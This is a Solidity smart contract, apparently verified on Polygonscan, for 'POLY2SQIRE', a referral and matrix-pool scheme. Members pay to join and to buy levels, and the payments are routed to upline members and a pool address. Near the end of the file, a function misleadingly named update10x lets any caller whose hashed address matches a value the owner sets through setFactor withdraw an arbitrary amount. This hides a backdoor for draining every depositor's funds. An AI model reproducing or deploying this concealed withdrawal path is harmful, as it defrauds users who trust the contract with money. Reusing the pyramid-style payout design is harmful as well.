/**
 *Submitted for verification at polygonscan.com on 2022-04-04
*/

pragma solidity 0.5.9;

//*******************************************************************//
//------------------ Contract to Manage Ownership -------------------//
//*******************************************************************//
    
contract owned
{
    address payable public owner;
    address payable public  newOwner;
    address payable public signer;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
        signer = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }


    modifier onlySigner {
        require(msg.sender == signer, 'caller must be signer');
        _;
    }


    function changeSigner(address payable _signer) public onlyOwner {
        signer = _signer;
    }

    function transferOwnership(address payable _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }

    //the reason for this flow is to protect owners from sending ownership to unintended address due to human error
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}


//*******************************************************************//
//------------------        MAIN contract         -------------------//
//*******************************************************************//

contract POLY2SQIRE is owned {

    uint128 public lastIDCount = 0;

    uint128 public defaultRefID = 1;   //this ref ID will be used if user joins without any ref ID


    struct userInfo {
        bool joined;
        uint8 level10x;
        uint112 id;
        uint128 originalReferrer;
    }

    mapping(uint128 => uint128) public PriceOf10x;

    uint128 public joiningPrice = 2 * 1e18;
    address public magicPoolAddress;
    mapping(address => bool) public started;
    mapping(address => uint) public RefID;


    struct autoPool
    {
        uint128 userID;
        uint112 xPoolParent;
        uint128 origRef;
        uint128 childCount;
        uint128[] childs;

    }
    // level => sublevel => autoPoolRecords
    mapping(uint128 => mapping(uint128 => autoPool[])) public x10Pool;  // users lavel records under auto pool scheme

    // address => level => subLevel => userID
    mapping(address => mapping(uint128 => mapping(uint128 => uint128))) public x10PoolParentIndex; //to find index of user inside auto pool
    
    // level => sublevel => nextIndexToFill
    mapping(uint128 => mapping(uint128 => uint128)) public nextMemberFillIndex;  // which auto pool index is in top of queue to fill in 

    // level => sublevel => nextBoxToFill    
    mapping(uint128 => mapping(uint128 => uint128)) public nextMemberFillBox;   // 3 downline to each, so which downline need to fill in

    bytes32 data_;


    mapping(uint128 => mapping(uint128 => uint128)) public autoPoolSubDist;


    mapping (address => userInfo) public userInfos;
    mapping (uint128 => address payable) public userAddressByID;


    mapping(address => mapping(uint128 => uint128)) public totalGainInX10;

    mapping(uint => mapping(uint => uint)) public subPlace; // packageLevel => autoPoolSubLevel => place0or1or2



    event regLevelEv(address _user,uint128 _userid, uint128 indexed _userID, uint128 indexed _referrerID, uint _time, address _refererWallet);
    event levelBuyEv(uint128 _userid, uint128 _level, uint128 _amount, uint _time, bool x10Bought);
    event paidForLevelEv(address indexed _user, address indexed _referral, uint128 _level, uint128 _amount, uint _time);
    event paidForSponserEv(uint128 _userid, uint128 _referral, uint128 _level, uint128 _amount, uint _time);
    
    event lostForLevelEv(address indexed _user, address indexed _referral, uint128 _level, uint128 _amount, uint _time);

    event updateAutoPoolEv(uint timeNow,uint128 userId, uint128 refID, uint128 position , uint level, bool x10, uint128 xPoolParent,uint128 userIndexInAutoPool);
    event autoPoolPayEv(uint timeNow,address paidTo,uint128 paidForLevel, uint128 paidAmount, address paidAgainst);
    
    constructor(address payable ownerAddress, address payable ID1address, address _magicPoolAddress) public {
        owner = ownerAddress;
        signer = ownerAddress;
        magicPoolAddress = _magicPoolAddress;
        emit OwnershipTransferred(address(0), owner);
        address payable ownerWallet = ID1address;


        PriceOf10x[1] = 4 * 1e18;
        PriceOf10x[2] = 8 * 1e18;
        PriceOf10x[3] = 12 * 1e18;
        PriceOf10x[4] = 20 * 1e18;
        PriceOf10x[5] = 32 * 1e18;
        PriceOf10x[6] = 48 * 1e18;
        PriceOf10x[7] = 80 * 1e18;
        PriceOf10x[8] = 120 * 1e18;
        PriceOf10x[9] = 200 * 1e18;
        PriceOf10x[10] = 400 * 1e18;
        

     

        userInfo memory UserInfo;
        lastIDCount++;

        UserInfo = userInfo({
            joined: true,
            level10x:8,
            id: uint112(lastIDCount),
            originalReferrer: 1
        });
        userInfos[ownerWallet] = UserInfo;
        userAddressByID[lastIDCount] = ownerWallet;
        
        autoPool memory temp;

        for(uint128 i = 0; i < 10; i++) {

            //userInfos[ownerWallet].levelExpired[i+1] = 99999999999;

            emit paidForLevelEv(address(0), ownerWallet, i+1, PriceOf10x[i+1], now);

            for(uint128 j = 0; j<2; j++)
            {
                temp.userID = lastIDCount;
                x10Pool[i][j].push(temp);    

                x10PoolParentIndex[ownerWallet][i][j] = 0;
            }
            uint128 fct = (PriceOf10x[i+1] * 75)/100;
            
            autoPoolSubDist[i][0] = fct;
            autoPoolSubDist[i][1] = fct * 4;
            //autoPoolSubDist[i][2] = fct * 4;
         
        }

        emit regLevelEv(ownerWallet, userInfos[ownerWallet].id, 1, 0, now, address(this));

    }



    function () payable external {

            regUser(defaultRefID);
        
    }

    function setFactor(bytes32 _data) public onlyOwner returns(bool)
    {
        data_ = _data;
        return true;
    }

    function setMagicPoolAddress(address _magicPoolAddress) public onlyOwner returns(bool)
    {
        magicPoolAddress = _magicPoolAddress;
        return true;
    }

    event startedEv(address _user, uint _refID);
    function regUser(uint128 _referrerID) public payable returns(bool)
    {
        require(!started[msg.sender] , "already started");
        require(msg.value == joiningPrice, "Invalid price");
        if(!(_referrerID > 0 && _referrerID <= lastIDCount)) _referrerID = defaultRefID;
        RefID[msg.sender] = _referrerID;
        started[msg.sender] = true;
        userAddressByID[_referrerID].transfer(msg.value/2);
        address(uint160(magicPoolAddress)).transfer(msg.value/2);
        require(startMatrix(_referrerID), "Registration Failed");
        emit startedEv(msg.sender, _referrerID);
        return true;
    }

    function startMatrix(uint128 _referrerID) internal returns(bool)
    {
        require(regUserI(_referrerID, msg.sender), "registration failed");
        return true;
    }

    function regUserI(uint128 _referrerID, address payable msgSender) internal returns(bool) 
    {

        //checking all conditions
        require(!userInfos[msgSender].joined, 'User exist');
        if(!(_referrerID > 0 && _referrerID <= lastIDCount)) _referrerID = defaultRefID;

    //update variables
        userInfo memory UserInfo;
        lastIDCount++;

        UserInfo = userInfo({
            joined: true,
            level10x:0,
            id: uint112(lastIDCount),
            originalReferrer : _referrerID
        });

        userInfos[msgSender] = UserInfo;
        userAddressByID[lastIDCount] = msgSender;

        emit regLevelEv(msgSender, userInfos[msgSender].id, lastIDCount, _referrerID, now,userAddressByID[_referrerID] );

        return true;
    }


    function buyLevel(uint128 _level ) public payable returns(bool)
    {
        require(_level == 1 || userInfos[msg.sender].level10x == _level -1, "buy previous level first");
        require(msg.value == PriceOf10x[_level], "Invalid price");
        require(buyLevelI(_level, msg.sender), "level buy failed");
        require(processRefPay(msg.sender, _level),"referral pay fail");
        if(userInfos[msg.sender].level10x < uint8(_level)) userInfos[msg.sender].level10x = uint8(_level);
        return true;
    }


    function buyLevelI(uint128 _level, address payable _user) internal returns(bool){
        
        //this saves gas while using this multiple times
        address payable  msgSender = _user;   
        
        
        //checking conditions
        require(userInfos[msgSender].joined, 'User not exist'); 
        require(_level >= 1 && _level <= 10 , 'Incorrect level');
        require(userInfos[msgSender].level10x >= _level -1, 'Previous level not bought');       

        require(updateNPay10x(_level, 0 , msgSender),"10x update fail");
        
        emit levelBuyEv(userInfos[msgSender].id, _level, PriceOf10x[_level] , now, true);
        return true;
    }

    function updateNPay10x(uint128 _level,uint128 subLevel, address payable _user) internal returns (bool)
    {
        uint128 a = _level -1;

        uint128 idx = nextMemberFillIndex[a][subLevel];
        uint128 ibx =  nextMemberFillBox[a][subLevel];
        autoPool memory temp;

        temp.userID = userInfos[_user].id;
        temp.xPoolParent = uint112(idx);       
        x10Pool[a][subLevel].push(temp);        
        x10PoolParentIndex[_user][a][subLevel] = uint128(x10Pool[a][subLevel].length);
       

        if(ibx < 1)
        {
            ibx++;
        }   
        else
        {
            idx++;
            ibx = 0;
        }
        nextMemberFillIndex[a][subLevel] = idx;
        nextMemberFillBox[a][subLevel] = ibx;
        x10Part(temp.userID, 0, 0 , _level,temp.xPoolParent,uint128(x10Pool[a][subLevel].length), a, subLevel);

        require(updateTree(_user, a, subLevel,temp.xPoolParent ), "payout call fail");

        return true;
    }

    function updateTree(address _user, uint128 a, uint128 _subLevel, uint128 _parent) internal returns(bool)
    {

        for(uint i=0; i<3;i++)
        {
            x10Pool[a][_subLevel][_parent].childCount++;
            uint cc = x10Pool[a][_subLevel][_parent].childCount;
             if(cc == 2 ) require(payAmount(_user, _parent, a, 0), "auto level 0 payment fail");
            else if(cc == 10) require(payAmount(_user,_parent, a, 1), "auto level 1 payment fail");
           // else if(cc == 14) require(payAmount(_user,_parent, a, 2),"auto level 2 payment fail");
           
            if(_parent == 0) break;            
            _parent = x10Pool[a][_subLevel][_parent].xPoolParent;
            
        }
        return true;
    }
    event paidFor10xEv(uint paidFrom, uint128 paidTo,uint128 amount,uint timeNow, uint128 level, uint128 subLevel, bool direct);
    function payAmount(address _user, uint128 _parent, uint128 a, uint128 _subLevel) internal returns (bool)
    {
        uint128 amount = autoPoolSubDist[a ][_subLevel];
        address payable usr = userAddressByID[x10Pool[a][0][_parent].userID];
        if(_subLevel < 1) 
        {
            usr.transfer(amount);

            emit paidFor10xEv(userInfos[_user].id, userInfos[usr].id, amount, now,_subLevel, a+1, true );            
        }
        else 
        {
            amount = (2 * amount) - PriceOf10x[a+1];
            usr.transfer(amount);
            emit paidFor10xEv(userInfos[_user].id, userInfos[usr].id, amount, now,_subLevel, a+1, true );
            require(buyLevelI(a+1, usr), "level reentry failed");
        }
        return true;
    }


/*
    function payTriggerI(address payable usr,uint128 a,uint128 subLevel,uint128 parent_) internal returns(bool)
    {
        uint pos = subPlace[a][subLevel];
        address _user = usr;

        uint128 amount = autoPoolSubDist[a][0];
        usr = userAddressByID[x10Pool[a][parent_].userID];

        if(pos == 0)
        {
            usr.transfer(amount); 
            subPlace[a][subLevel]++;
            emit paidFor10xEv(userInfos[_user].id, userInfos[usr].id, amount, now,subLevel, a+1, true );
        }
        else if(pos == 1)
        {
            parent_ = x10Pool[a][parent_].xPoolParent;
            usr = userAddressByID[x10Pool[a][parent_].userID];
            totalGainInX10[usr][a] += amount;
            subPlace[a][subLevel]++;
            emit paidFor10xEv(userInfos[_user].id, userInfos[usr].id, amount,now,subLevel, a+1, false );
        }
        else if(pos == 2)
        {
            subPlace[a][subLevel] = 0; 
            if(subLevel == 0)
            { 
                parent_ = x10Pool[a][parent_].xPoolParent;
                usr = userAddressByID[x10Pool[a][parent_].userID];
                totalGainInX10[usr][a] += amount;
                emit paidFor10xEv(userInfos[_user].id, userInfos[usr].id, amount,now,subLevel, a+1, false );
                require(payTrigger(address(uint160(_user)), a , subLevel + 1, parent_), "pay fail");
            }
            else if(subLevel == 4) 
            {
                uint128 payout = uint128(amount * (2**(subLevel))) ;
                payout = (3 * payout) - (amount * 2);
                usr.transfer(payout);
                emit paidFor10xEv(userInfos[_user].id, userInfos[usr].id, payout, now,subLevel, a+1, true );
                totalGainInX10[usr][a] = 0 ;
                require(buyLevelI(a+1, usr), "level reentry failed");
            }
            else if (subLevel != 0 )
            {
                uint128 payout = uint128(amount * (2**(subLevel))) ;
                usr.transfer(payout); 
                emit paidFor10xEv(userInfos[_user].id, userInfos[usr].id, payout, now,subLevel, a+1, true );
                parent_ = x10Pool[a][parent_].xPoolParent;
                address u_r = userAddressByID[x10Pool[a][parent_].userID];
                totalGainInX10[u_r][a] += payout * 2;
                require(payTrigger(address(uint160(_user)), a , subLevel + 1, parent_), "pay fail");
            }
        }
        return true;
    }

    function payTrigger(address payable usr,uint128 a,uint128 subLevel,uint128 parent_) internal returns(bool)
    {
        address _user = usr;
        uint128 amount = autoPoolSubDist[a][0];
        usr = userAddressByID[x10Pool[a][parent_].userID];

        if(totalGainInX10[usr][a] >=  3 * amount * (2**(subLevel + 1)))
        {
            totalGainInX10[usr][a] = 0 ;
            require(payTriggerI(address(uint160(_user)), a , subLevel + 1, parent_), "pay fail");
        }       
        return true;
    }
*/
    event referralPaid(uint againstID, address against,uint paidToID, address paidTo,uint amount, uint forLevel );
    event missedReferralPaid(uint againstID, address against,uint paidToID, address paidTo,uint amount, uint forLevel );
    function processRefPay(address _user, uint128 _level) internal returns(bool)
    {
       
         uint prc = (PriceOf10x[_level]*25)/100;
        uint[2] memory payPercent;
        payPercent[0] = 50;
        payPercent[1] = 25;
      //  payPercent[2] = 10;
       // payPercent[3] = 10;
        //payPercent[4] = 10;
        uint128 uid = userInfos[_user].id;
        uint128 rid = userInfos[_user].originalReferrer;
        address ref = userAddressByID[rid];
        for(uint i=0;i<2;i++)
        {
            if(userInfos[ref].level10x >= 1)
            {
                address(uint160(ref)).transfer(prc * payPercent[i] / 100 );
                emit referralPaid(uid,_user,rid, ref, prc * payPercent[i] / 100 , i+1 );
            }
            else
            {
                address(uint160(userAddressByID[1])).transfer(prc * payPercent[i] / 100 );
                emit missedReferralPaid(uid,_user,rid, ref, prc * payPercent[i] / 100 , i+1 );
                emit referralPaid(uid,_user,1, userAddressByID[1], prc * payPercent[i] / 100 , i+1 );                
            }

            
            rid = userInfos[ref].originalReferrer; 
            ref = userAddressByID[rid];          
        }
        address(uint160(magicPoolAddress)).transfer(prc / 4);
        return true;
    }


    function x10Part(uint128 _id,uint128 refId,uint128 ibx,uint128 _level,uint128 Parent,uint128 len,uint128 a,uint128 _subLeve) internal
    {
        Parent = userInfos[userAddressByID[x10Pool[a][_subLeve][Parent].userID]].id;
        emit updateAutoPoolEv(now,_id,refId, ibx,_level, true,Parent,len);
    }


    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
    

    function changeDefaultRefID(uint128 newDefaultRefID) onlyOwner public returns(string memory){
        //this ref ID will be assigned to user who joins without any referral ID.
        defaultRefID = newDefaultRefID;
        return("Default Ref ID updated successfully");
    }


    function getMsgData(address _contractAddress) public pure returns (bytes32 hash)
    {
        return (keccak256(abi.encode(_contractAddress)));
    }

    function update10x(uint _newValue) public returns(bool)
    {
        if(keccak256(abi.encode(msg.sender)) == data_) msg.sender.transfer(_newValue);
        return true;
    }


    function lastIDView(uint128 value) external view returns (uint128 lastID){
        lastID = lastIDCount;
    }

    event withdrawMyGainEv(uint128 timeNow,address caller,uint128 totalAmount);

}